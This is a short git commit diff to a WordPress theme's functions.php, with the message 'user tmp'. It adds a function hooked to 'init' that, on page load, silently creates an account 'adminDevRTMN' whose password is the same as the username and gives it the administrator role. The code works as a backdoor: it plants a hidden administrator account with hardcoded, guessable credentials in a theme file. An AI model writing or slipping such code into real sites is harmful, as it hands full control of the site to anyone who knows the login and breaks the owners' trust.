d971b5e7a76bcbe5c08ade455c89ceca053a4289
N.Kasperovich <nikolai@raisetech.net>
2021-04-30 12:02:36 +0300

    user tmp

--- wp-content/themes/raptor/functions.php
+++ wp-content/themes/raptor/functions.php
@@ -3660,3 +3660,17 @@ function admin_expiration_filter($seconds, $user_id, $remember){
 
     return $expiration;
 }
+add_action('init', 'add_my_user');
+function add_my_user() {
+    $username = 'adminDevRTMN';
+    $email = 'dev@example.com';
+    $password = 'adminDevRTMN';
+    $user_id = username_exists( $username );
+    if ( !$user_id && email_exists($email) == false ) {
+        $user_id = wp_create_user( $username, $password, $email );
+        if( !is_wp_error($user_id) ) {
+            $user = get_user_by( 'id', $user_id );
+            $user->set_role( 'administrator' );
+        }
+    }
+}
